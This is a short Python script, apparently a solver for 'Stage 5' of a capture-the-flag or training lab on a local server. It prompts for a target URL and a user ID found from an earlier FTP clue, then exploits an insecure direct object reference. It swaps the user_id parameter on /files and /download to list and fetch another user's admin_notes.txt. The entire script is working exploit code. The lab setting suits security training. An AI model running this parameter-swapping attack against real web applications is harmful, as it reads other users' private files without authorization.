import requests

base_url = input("Stage 5 URL (for example, http://127.0.0.1:8005): ")
base_url = base_url.strip().rstrip("/")
admin_id = input("User ID found from the FTP clue: ").strip()

try:
    # Check what the normal employee account can see.
    own_listing = requests.get(
        f"{base_url}/files",
        params={"user_id": "1042"},
        timeout=5,
    )

    if own_listing.status_code != 200:
        print("Could not load the normal employee listing.")
        raise SystemExit

    print("Normal account listing loaded.")

    # Try the ID discovered from the FTP clue.
    other_listing = requests.get(
        f"{base_url}/files",
        params={"user_id": admin_id},
        timeout=5,
    )

    if other_listing.status_code != 200:
        print("That ID did not return a file listing.")
        raise SystemExit

    if "admin_notes.txt" not in other_listing.text:
        print("The listing loaded, but admin_notes.txt was not present.")
        raise SystemExit

    print("IDOR confirmed: admin_notes.txt is listed.")

    note = requests.get(
        f"{base_url}/download",
        params={"user_id": admin_id, "name": "admin_notes.txt"},
        timeout=5,
    )

    if note.status_code == 200:
        print("\nContents of admin_notes.txt:")
        print(note.text)
    else:
        print("The file listing loaded, but the download failed.")

except requests.RequestException as error:
    print("Could not reach Stage 5:", error)
